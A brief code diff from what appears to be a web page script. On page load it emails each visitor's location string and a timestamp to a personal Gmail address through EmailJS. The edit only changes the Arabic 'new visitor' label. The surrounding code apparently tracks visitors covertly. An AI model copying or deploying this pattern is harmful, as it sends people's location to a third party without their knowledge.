@@ -36,7 +36,7 @@ window.onload = function () {
 
             return emailjs.send("service_25q0ern", "template_xi6fmgy", {
                 to_email: "e508769103@gmail.com",
-                name: "زائر جديد",
+                name: "زائرff جديد",
                 time: new Date().toLocaleString('ar-EG'),
                 message: locationString
             });
